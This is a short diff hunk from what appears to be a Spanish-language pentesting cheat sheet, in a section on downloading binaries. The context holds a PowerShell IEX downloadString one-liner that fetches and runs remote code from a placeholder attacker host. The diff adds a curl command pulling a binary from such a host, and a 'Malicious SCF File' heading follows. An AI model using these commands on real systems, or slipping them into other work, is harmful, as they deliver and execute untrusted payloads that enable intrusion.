@@ -306,7 +306,9 @@ Descargar binarios
 ```
 powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
 ```
-
+```
+curl "http://IP/binario" -o binario
+```
 ## Hashes
 
 Malicious SCF File
